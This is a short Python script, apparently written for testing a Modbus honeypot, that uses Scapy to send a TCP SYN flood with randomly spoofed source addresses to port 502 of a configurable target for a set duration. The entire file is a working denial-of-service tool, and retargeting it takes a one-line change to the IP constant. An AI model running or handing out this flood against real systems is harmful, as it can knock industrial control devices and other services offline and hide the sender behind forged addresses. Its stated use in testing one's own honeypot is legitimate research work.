from scapy.all import IP, TCP, send
import random
import time

# CONFIGURATION
TARGET_IP = "192.168.220.7"        # Change to your Modbus honeypot IP
TARGET_PORT = 502                  # Modbus TCP port
PACKETS_PER_SECOND = 100000          # Adjust as needed for test intensity
DURATION = 30                      # Total duration of the attack in seconds

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def syn_flood():
    print(f"[+] Starting TCP SYN flood to {TARGET_IP}:{TARGET_PORT}")
    end_time = time.time() + DURATION
    sent = 0

    while time.time() < end_time:
        src_ip = random_ip()
        src_port = random.randint(1024, 65535)
        seq = random.randint(1000, 100000)

        packet = IP(src=src_ip, dst=TARGET_IP) / TCP(sport=src_port, dport=TARGET_PORT, flags="S", seq=seq)
        send(packet, verbose=False)
        sent += 1

        if sent % PACKETS_PER_SECOND == 0:
            time.sleep(1)

    print(f"[+] Attack complete. Packets sent: {sent}")

if __name__ == "__main__":
    syn_flood()
